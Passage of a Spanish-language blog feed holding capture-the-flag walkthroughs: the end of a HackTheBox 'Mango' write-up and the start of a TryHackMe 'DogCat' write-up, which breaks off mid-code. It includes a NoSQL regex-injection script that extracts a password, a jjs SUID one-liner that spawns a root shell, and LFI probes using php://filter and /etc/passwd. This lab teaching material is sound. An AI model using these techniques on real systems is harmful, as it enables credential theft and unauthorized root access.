&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tambien podemos utilizar el script que &lt;strong&gt;PayloadAllTheThings&lt;/strong&gt; tiene en NoSQL Injection, modificando un poco el codigo para adaptarlo a esta maquina quedaria de esta forma:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;urllib3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;disable_warnings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#username=&amp;#34;mango&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://staging-order.mango.htb/index.php&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;application&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;x-www-form-urlencoded&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;username[$eq]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mango&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password[$regex]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;^&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;#print payload&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allow_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;302&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            	&lt;span class=&#34;c1&#34;&gt;#print &amp;#34;For check the payload ...&amp;#34;&lt;/span&gt;
            	&lt;span class=&#34;c1&#34;&gt;#print payload            	&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Found one more char : &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos la contraseña del usuario mongo pero no pudimos iniciar sesion en el panel, nos redirige al index, utilizamos las credenciales en el servicio ssh y logramos obtener una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_23-10-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de los servicios de la maquina encontramos que esta corriendo mongo en el puerto 27017.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_23-11-56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando la shell de mongo pudimos obtener las credenciales del usuario admin.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_23-13-31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos de usuario y obtuvimos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_23-14-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos los ficheros SUID para tomar ventaja de estos, encontramos que existe en la maquina jjs, utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/jjs/&#34;&gt;&lt;strong&gt;GTFOBINS&lt;/strong&gt;&lt;/a&gt; para obtener una shell. Modificamos sh por bash, ya que nos da un error al intentar ejecutar comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Java.type(&amp;#39;java.lang.Runtime&amp;#39;).getRuntime().exec(&amp;#39;/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p &amp;lt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;tty&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;tty&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 2&amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;tty&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;).waitFor()&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos nuestra shell con privilegios root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_23-18-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/mango/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/mango/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - DogCat</title>
        <link>https://sckull.github.io/posts/dogcat/</link>
        <pubDate>Sat, 18 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 18 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/dogcat/</guid>
        <description>DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;DogCat&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;I made a website where you can look at pictures of dogs and/or cats!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;335&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/jammy&#34;&gt;jammy&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Apr 17 20:42:19 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan dogcat.thm&lt;/span&gt;
Warning: dogcat.thm giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dogcat.thm
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65497&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: dogcat
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/tools/Kadimus# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; -x php,html,txt
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cat.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/flag.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cats &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dogs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dog.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.&lt;/p&gt;
&lt;h2 id=&#34;lfi---cat-or-dog&#34;&gt;LFI - CAT OR DOG&lt;/h2&gt;
&lt;p&gt;Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje &lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Lo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje &lt;code&gt;Here you go!&lt;/code&gt; y un error de la funcion &lt;code&gt;include()&lt;/code&gt;. Desde aqui tiene un poco de sentido el mensaje de error anterior (&lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;php://filter/convert.base64-encode/dog/resource=ARCHIVO&lt;/code&gt; para leer archivos, en este caso leemos el archivo index.php que es el que utiliza &lt;code&gt;?view=&lt;/code&gt;, logramos obtener el archivo en base64.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.25.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
&lt;details&gt;
  &lt;summary&gt;**ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER`&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;  &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
